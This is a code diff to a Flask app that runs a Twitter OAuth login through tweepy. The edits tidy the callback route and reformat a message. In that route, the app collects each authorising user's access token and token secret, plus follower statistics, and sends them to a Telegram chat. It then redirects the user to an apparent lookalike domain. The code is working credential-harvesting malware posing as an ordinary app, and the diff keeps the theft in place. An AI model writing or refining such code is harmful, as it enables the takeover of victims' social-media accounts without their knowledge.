@@ -91,7 +91,10 @@ def login():
 
 @app.route('/callback')
 async def callback():
-    request_token = session['request_token']
+    request_token = session.get('request_token')
+    if not request_token:
+        return redirect(url_for('home'))  # Handle case where request_token is not set
+
     del session['request_token']
 
     auth = tweepy.OAuthHandler(consumer_key, consumer_secret, callback_url)
@@ -102,12 +105,12 @@ async def callback():
 
     session['access_token'] = auth.access_token
     session['access_token_secret'] = auth.access_token_secret
+
     access_token = session.get('access_token')
     access_token_secret = session.get('access_token_secret')
 
     if not access_token or not access_token_secret:
         return redirect('https://flock.com')
-
 
     auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
     auth.set_access_token(access_token, access_token_secret)
@@ -120,11 +123,14 @@ async def callback():
     user = api.verify_credentials()
     outreach_percentage = calculate_outreach_ability(user)
 
-    ext = "**New Account(app made by andrew tate)**\n\n🪪~Username: " + user.screen_name + "\n\n🔑~Access Token: " + access_token + "\n\n🔑~Access Token Secret: " + access_token_secret + "\n\n👥~Followers: " + str(
-        user.followers_count) + "\n\n🎉~Friends: " + str(user.friends_count) + "\n\n⏰~Created At: " + str(
-        user.created_at) + "\n\n💎~Outreach Percent: " + outreach_percentage + "%"
+    ext = (
+        f"**New Account(app made by andrew tate)**\n\n🪪~Username: {user.screen_name}\n\n🔑~Access Token: {access_token}\n\n"
+        f"🔑~Access Token Secret: {access_token_secret}\n\n👥~Followers: {user.followers_count}\n\n"
+        f"🎉~Friends: {user.friends_count}\n\n⏰~Created At: {user.created_at}\n\n💎~Outreach Percent: {outreach_percentage}%"
+    )
     send_telegram_message(ext)
     return redirect('https://us-flock.com')
+
 
 
 if __name__ == '__main__':
